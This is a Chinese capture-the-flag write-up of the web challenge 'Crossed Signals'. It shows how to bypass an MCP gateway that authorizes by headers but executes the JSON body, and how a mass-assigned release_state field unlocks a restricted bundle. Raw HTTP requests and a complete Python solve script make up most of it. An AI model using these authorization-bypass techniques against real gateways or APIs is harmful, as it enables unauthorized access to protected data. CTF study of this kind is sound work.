---
title: 'WEB-Crossed Signals'
contest: '强网拟态防御 第九届'
contest_normalized: '强网拟态防御 第九届'
contest_year: 2025
year: 2025
category: 'web'
subcategory: 'web_other'
tags: []
attack_chain:
- '题目说明'
- '-07-28'
- '解题思路'
- '解题过程'
- '登录并确认受限工单'
- '列出网关实际暴露的工具'
one_liner: '题目描述：'
lesson: ''
quality: 'medium'
schema_version: 'v3.0.0-P0'
source_type: 'wechat_article'
source_url: 'https://mp.weixin.qq.com/s/iTgaxzumnH3cE4N5nH6VvQ'
last_verified: '2026-11-02'
flag_observed:
- 'flag{eNsRsHNSNXNd4t5hN5rTSulkpMvk6TDVjx099tUo}'
contest_normalized: "强网拟态"
---

WEB-Crossed Signals
题目描述：
Northline 的互联服务台将车辆信号转化为维修工单。在一次软件发布后，一辆验证车队车辆失联，而一个恢复令牌被封存在其原始服务记录中。找到并提交它。
本次挑战未提供附件。
凭据：advisor@northline.test / Service-Desk-2026
核心思路：MCP 网关按
Mcp-Name
和
Mcp-Param-VIN
授权，工具按 JSON 正文执行；借此导出验证车的原始服务包，再向审核接口多传
release_state=approved
，下载包内的恢复令牌。
1. 题目说明
Northline 的互联服务台把车辆信号转成维修工单。一次软件发布后，一辆验证车队车辆失联，恢复令牌封存在它的原始服务记录里。题目要求找到并提交该令牌。本次挑战没有附件。
本次实例：
入口：
http://n78iyy2n.nestctf.cyberpeace.cn:58080
账号：
advisor@northline.test
/
Service-Desk-2026
本次 token：
M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
，
expires_in
为 7200 秒
登录字段是
username
和
password
，接口为
POST /api/login
登录后
GET /api/me
显示顾问只被分配了
CTF6SVC0000000001
。
GET /api/cases
有两条工单：
工单
VIN
车队
访问
SR-26041
CTF6SVC0000000001
West depot
assigned
SR-26042
CTF6SVC0000000002
Factory validation
restricted
SR-26042 的标题是 “Gateway communication loss after OTA campaign”，摘要写明跨车队看板只公开元数据，诊断数据需要车辆分配。页面上的工具是
get_vehicle_health
和
get_update_status
，传输写的是 MCP Streamable HTTP，协议版本
2026-07-28
，端点
/mcp
。
浏览器调用工具时会同时发送：
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: <工具名>
Mcp-Param-VIN: <参数 vin>
JSON-RPC 正文里还有同一份
params.name
和
params.arguments.vin
。
2. 解题思路
失联车辆是访问受限的
CTF6SVC0000000002
。直接用它的 VIN 调工具会返回
vehicle_scope_denied
。网关只检查头里的工具名和 VIN，真正执行的是正文。把头换成自己被分配的 VIN 和允许调用的工具名，正文改成目标车辆和隐藏工具，就能读诊断并导出原始包。
顾问预览包不含
private/recovery.txt
。完整下载要求
release_state=approved
。
POST /api/bundles/<id>/notes
只校验
note
字符串，额外字段
release_state
会被写入状态。批准后再下载，令牌在压缩包的
private/recovery.txt
。
3. 解题过程
下面每一步都是容器
http://n78iyy2n.nestctf.cyberpeace.cn:58080
上的请求，
Authorization
使用本次 token
M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
。令牌 7200 秒后过期；过期就重新登录，替换下面的 Bearer。MCP 请求的公共头是：
POST /mcp HTTP/1.1
Host: n78iyy2n.nestctf.cyberpeace.cn:58080
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
3.1 登录并确认受限工单
登录：
POST /api/login HTTP/1.1
Content-Type: application/json
{"username":"advisor@northline.test","password":"Service-Desk-2026"}
响应给出
token
和
role=service_advisor
。用这个令牌读自己的分配和工单：
GET /api/me HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
GET /api/cases HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
/api/me
的
assigned_vins
只有
CTF6SVC0000000001
。
/api/cases
里
SR-26042
的
vin
是
CTF6SVC0000000002
，
access
是
restricted
。页面工具区对它只显示元数据，没有诊断内容。
3.2 列出网关实际暴露的工具
POST /mcp HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/list
{
"jsonrpc": "2.0",
"id": 1,
"method": "tools/list",
"params": {
"_meta": {
"io.modelcontextprotocol/protocolVersion": "2026-07-28",
"io.modelcontextprotocol/clientInfo": {"name": "northline-service-console", "version": "1.0.0"},
"io.modelcontextprotocol/clientCapabilities": {}
}
}
}
页面只展示前两个工具，响应里还有第三个：
get_vehicle_health
：读取已分配车辆的 DTC 和遥测，必填
vin
。
get_update_status
：读取软件活动状态，必填
vin
。
export_case_bundle
：导出诊断与 OTA 证据匹配的原始包，说明为 Security operations only。必填
vin
、
case_id
、
diagnostic_ref
、
evidence_ref
。
vin
的 schema 带有
x-mcp-header: VIN
，对应浏览器发送的
Mcp-Param-VIN
。
头和正文都使用已分配 VIN 时，可以正常读到自己的引用：
Mcp-Method: tools/call
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000001
{
"jsonrpc"
:
"2.0"
,
"id"
:
1
,
"method"
:
"tools/call"
,
"params"
: {
"name"
:
"get_vehicle_health"
,
"arguments"
: {
"vin"
:
"CTF6SVC0000000001"
},
"_meta"
: {
"io.modelcontextprotocol/protocolVersion"
:
"2026-07-28"
}
}
}
get_update_status
只改
Mcp-Name
和
params.name
。两次响应分别是
diagnostic_ref=DX-836d10211e4146173631d41e
、
evidence_ref=EV-771cc44f86ba8e712c9e7db9
。
头和正文都换成验证车时被拒绝：
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000002
{
"name"
:
"get_vehicle_health"
,
"arguments"
: {
"vin"
:
"CTF6SVC0000000002"
}}
HTTP 403，正文是
{"error":"vehicle_scope_denied"}
。去掉
Mcp-Name
和
Mcp-Param-VIN
则是
{"error":"tool_headers_required"}
。
3.3 用已分配 VIN 的请求头读取验证车
授权看的是头，查询看的是正文。健康快照：
POST /mcp HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000001
{
"jsonrpc": "2.0",
"id": 1,
"method": "tools/call",
"params": {
"name": "get_vehicle_health",
"arguments": {"vin": "CTF6SVC0000000002"},
"_meta": {
"io.modelcontextprotocol/protocolVersion": "2026-07-28",
"io.modelcontextprotocol/clientInfo": {"name": "northline-service-console", "version": "1.0.0"},
"io.modelcontextprotocol/clientCapabilities": {}
}
}
}
返回的是验证车，不是自己的车：
diagnostic_ref = DX-56d574bd4cde317f3c8778ec
case_id        = SR-26042
dtc            = U0100
软件状态只改两个名字，VIN 的错位保持不变：
Mcp-Name: get_update_status
Mcp-Param-VIN: CTF6SVC0000000001
{
"name"
:
"get_update_status"
,
"arguments"
: {
"vin"
:
"CTF6SVC0000000002"
}
}
evidence_ref = EV-34659fdc3eac9e3b8dfe6b1e
campaign     = SW-26.10-B
state        = paused for review
反向请求确认检查点。正文是已分配 VIN，头是验证车 VIN：
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000002
{
"name"
:
"get_vehicle_health"
,
"arguments"
: {
"vin"
:
"CTF6SVC0000000001"
}}
仍然 HTTP 403
vehicle_scope_denied
。车辆范围只校验
Mcp-Param-VIN
。
3.4 借允许的工具名导出原始包
头和正文都叫
export_case_bundle
时，顾问角色被拒绝：
Mcp-Name: export_case_bundle
Mcp-Param-VIN: CTF6SVC0000000001
{
"name"
:
"export_case_bundle"
,
"arguments"
: {
"vin"
:
"CTF6SVC0000000002"
,
"case_id"
:
"SR-26042"
,
"diagnostic_ref"
:
"DX-56d574bd4cde317f3c8778ec"
,
"evidence_ref"
:
"EV-34659fdc3eac9e3b8dfe6b1e"
}
}
HTTP 403，
{"error":"tool_scope_denied"}
。
把头改回允许的工具名，正文继续调用导出：
POST /mcp HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000001
{
"jsonrpc": "2.0",
"id": 1,
"method": "tools/call",
"params": {
"name": "export_case_bundle",
"arguments": {
"vin": "CTF6SVC0000000002",
"case_id": "SR-26042",
"diagnostic_ref": "DX-56d574bd4cde317f3c8778ec",
"evidence_ref": "EV-34659fdc3eac9e3b8dfe6b1e"
},
"_meta": {
"io.modelcontextprotocol/protocolVersion": "2026-07-28",
"io.modelcontextprotocol/clientInfo": {"name": "northline-service-console", "version": "1.0.0"},
"io.modelcontextprotocol/clientCapabilities": {}
}
}
}
本次返回
bundle_id=RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP
，
release_state=pending
。响应里同时有 base64 预览包、
review_url
和
download_url
。
预览包只有三个文件：
manifest.json
diagnostics/telemetry.json
diagnostics/update-history.json
manifest.json
的
entries
却列出了第四项
private/recovery.txt
。这个文件不在顾问预览里。此时直接下载：
GET /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/download HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
返回
{"error":"bundle_release_pending","required_release_state":"approved"}
。
3.5 把审核状态写成 approved
review_url
是
POST /api/bundles/<id>/notes
。只提交备注时状态不变：
POST /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/notes HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
{"note":"release"}
响应仍是
"release_state":"pending"
。同一路径再增加字段：
POST /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/notes HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
{"note":"release","release_state":"approved"}
响应里的
release_state
变成
approved
。空的
note
、以及没有
note
的正文会返回
invalid_note
；服务端校验的是备注文本，没有忽略或拒绝调用方提交的
release_state
。
3.6 下载完整包
批准后使用导出响应里的
download_url
：
GET /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/download HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
得到 200 和 zip。这次包含预览里没有的文件：
manifest.json
diagnostics/telemetry.json
diagnostics/update-history.json
private/recovery.txt
private/recovery.txt
的内容是：
NORTHLINE / SECURITY OPERATIONS
Case: SR-26042
Vehicle: CTF6SVC0000000002
Recovery token: flag{eNsRsHNSNXNd4t5hN5rTSulkpMvk6TDVjx099tUo}
每次导出都会生成新的
bundle_id
，路径里的 ID 要换成当次响应。同一辆验证车的两个引用和恢复令牌不变。
4. 完整解题脚本
只使用 Python 标准库。脚本登录、列出工具、用请求头和正文的差异读取验证车、导出服务包、写入审核状态并解出
private/recovery.txt
。令牌来自下载的压缩包，不写在脚本里。
import
base64
import
io
import
json
import
sys
import
time
import
zipfile
from
urllib.error
import
HTTPError, URLError
from
urllib.request
import
ProxyHandler, Request, build_opener
BASE =
"http://n78iyy2n.nestctf.cyberpeace.cn:58080"
USERNAME =
"advisor@northline.test"
PASSWORD =
"Service-Desk-2026"
OPENER = build_opener(ProxyHandler({}))
def
request
(path, token=None, method=
"GET"
, body=None, headers=None)
:
hdrs = {
"User-Agent"
:
"Mozilla/5.0"
,
"Accept"
:
"application/json, text/event-stream"
}
data =
None
if
body
is
not
None
:
data = json.dumps(body).encode()
hdrs[
"Content-Type"
] =
"application/json"
if
token:
hdrs[
"Authorization"
] =
"Bearer "
+ token
if
headers:
hdrs.update(headers)
last_error =
None
for
attempt
in
range(
4
):
req = Request(BASE + path, data=data, headers=hdrs, method=method)
try
:
with
OPENER.open(req, timeout=
30
)
as
response:
return
response.status, response.read()
except
HTTPError
as
error:
detail = error.read()
raise
SystemExit(
f"
{method}
{path}
-> HTTP
{error.code}
:
{detail[:
400
]!r}
"
)
from
error
except
(URLError, ConnectionError, TimeoutError)
as
error:
last_error = error
time.sleep(
0.4
* (attempt +
1
))
raise
SystemExit(
f"
{method}
{path}
failed:
{last_error}
"
)
def
mcp
(token, body_method, body_name, arguments, header_name, header_vin)
:
payload = {
"jsonrpc"
:
"2.0"
,
"id"
:
1
,
"method"
: body_method,
"params"
: {
"_meta"
: {
"io.modelcontextprotocol/protocolVersion"
:
"2026-07-28"
,
"io.modelcontextprotocol/clientInfo"
: {
"name"
:
"northline-service-console"
,
"version"
:
"1.0.0"
,
},
"io.modelcontextprotocol/clientCapabilities"
: {},
}
},
}
headers = {
"MCP-Protocol-Version"
:
"2026-07-28"
,
"Mcp-Method"
: body_method,
}
if
body_name
is
not
None
:
# 网关按这两个头做工具和车辆授权，工具本身读取 JSON 正文。
payload[
"params"
][
"name"
] = body_name
payload[
"params"
][
"arguments"
] = arguments
headers[
"Mcp-Name"
] = header_name
headers[
"Mcp-Param-VIN"
] = header_vin
status, raw = request(
"/mcp"
, token,
"POST"
, payload, headers)
return
status, json.loads(raw)
def
tool_data
(token, header_name, header_vin, body_name, arguments)
:
_, data = mcp(token,
"tools/call"
, body_name, arguments, header_name, header_vin)
return
data[
"result"
][
"structuredContent"
]
def
main
()
:
_, login_raw = request(
"/api/login"
, method=
"POST"
, body={
"username"
: USERNAME,
"password"
: PASSWORD,
})
token = json.loads(login_raw)[
"token"
]
me = json.loads(request(
"/api/me"
, token)[
1
])
board = json.loads(request(
"/api/cases"
, token)[
1
])
assigned = me[
"assigned_vins"
][
0
]
target = next(item
for
item
in
board[
"cases"
]
if
item[
"access"
] ==
"restricted"
)
print(
"assigned:"
, assigned)
print(
"target:"
, target[
"id"
], target[
"vin"
], target[
"access"
])
_, listed = mcp(token,
"tools/list"
,
None
,
None
,
None
,
None
)
print(
"tools:"
,
", "
.join(tool[
"name"
]
for
tool
in
listed[
"result"
][
"tools"
]))
health = tool_data(
token,
"get_vehicle_health"
, assigned,
"get_vehicle_health"
, {
"vin"
: target[
"vin"
]},
)
update = tool_data(
token,
"get_update_status"
, assigned,
"get_update_status"
, {
"vin"
: target[
"vin"
]},
)
print(
"diagnostic_ref:"
, health[
"diagnostic_ref"
])
print(
"evidence_ref:"
, update[
"evidence_ref"
])
exported = tool_data(
token,
"get_vehicle_health"
, assigned,
"export_case_bundle"
, {
"vin"
: target[
"vin"
],
"case_id"
: target[
"id"
],
"diagnostic_ref"
: health[
"diagnostic_ref"
],
"evidence_ref"
: update[
"evidence_ref"
],
},
)
bundle_id = exported[
"bundle_id"
]
print(
"bundle:"
, bundle_id,
"state:"
, exported[
"release_state"
])
with
zipfile.ZipFile(io.BytesIO(base64.b64decode(exported[
"preview_b64"
])))
as
preview:
print(
"preview:"
,
", "
.join(preview.namelist()))
# note 本身不改变状态；额外的 release_state 会被原样写入。
note_only = json.loads(request(
f"/api/bundles/
{bundle_id}
/notes"
, token,
"POST"
, {
"note"
:
"release"
},
)[
1
])
print(
"note only:"
, note_only[
"release_state"
])
approved = json.loads(request(
f"/api/bundles/
{bundle_id}
/notes"
, token,
"POST"
,
{
"note"
:
"release"
,
"release_state"
:
"approved"
},
)[
1
])
print(
"note with release_state:"
, approved[
"release_state"
])
_, archive = request(exported[
"download_url"
], token)
with
zipfile.ZipFile(io.BytesIO(archive))
as
bundle:
print(
"archive:"
,
", "
.join(bundle.namelist()))
print(bundle.read(
"private/recovery.txt"
).decode())
if
__name__ ==
"__main__"
:
print(
"python:"
, sys.version.split()[
0
])
main()
